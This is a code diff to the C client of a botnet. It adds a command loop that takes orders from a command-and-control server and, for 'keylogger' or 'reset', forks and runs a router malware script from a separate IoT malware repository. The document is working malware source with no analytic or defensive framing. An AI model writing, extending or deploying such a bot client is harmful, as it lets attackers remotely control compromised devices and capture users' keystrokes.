@@ -9,8 +9,8 @@ Client code for botnet
 bot_t botInfo;
 
 int repeated_connect( const char * server, struct addrinfo * rp ) {
-    int             sd;
-    char            message[256];
+    int   sd;
+    char  message[256];
     
     do {
         if ( errno = 0, (sd = socket( rp->ai_family, rp->ai_socktype, rp->ai_protocol )) == -1 ) {
@@ -91,12 +91,14 @@ void *commandInput(void *vargp) {
     /*
     Receive commands from the C&C server to execute
     */
-    int             sd = *((int *) vargp);
-    char            buffer[512];
-    int             len;
+    int    sd = *((int *) vargp);
+    int    len, rc;
+    char   buffer[512];
 
     while ((len = read(sd, buffer, sizeof(buffer) - 1)) > 0) {
-        runCommand(buffer);
+        rc = runCommand(buffer);
+        if (rc != 0)
+            fprintf(stderr, "\x1b[1;31mRunning command '%s' failed\x1b[0m\n", buffer);
     }
 
     printf("\x1b[1;31mConnection Terminated: killing bot %s\x1b[0m\n", botInfo.username);
@@ -106,9 +108,43 @@ void *commandInput(void *vargp) {
 }
 
 int runCommand(char *command) {
-    int rc = 0;
+    /*
+    Calls fork() to run python code of the 
+    specified command using execv()
+    NOTE: Depends on malware_iot repo being installed
+    */
+    int pid, status;
+    char *args[4] = {"../iot_malware/scripts/run_router_malware.sh", "-f"};
 
-    printf("Running %s...\n", command);
+    printf("Attempting to run %s...\n", command);
 
-    return rc;
+    if (strncmp("keylogger", command, 9) == 0) {
+        args[2] = "logger";
+        args[3] = NULL;
+    } else if (strncmp("reset", command, 5) == 0) {
+        args[2] = "reset";
+        args[3] = NULL;
+    } else {
+        return -1;
+    }
+
+    // Fork a new process to run the command using
+    // the malware script using execv()
+    switch (pid = fork()) {
+        case -1:
+            perror("fork failed");
+            exit(1);
+        case 0:
+            execv(args[0], args);
+            perror("exec failed");
+            exit(1);
+        default:
+            pid = wait(&status);
+            if (WIFEXITED(status))
+                printf("Pid %d exited with status %d\n", pid, WEXITSTATUS(status));
+            else
+                printf("Pid %d exited abnormally\n", pid);
+    }
+
+    return 0;
 }
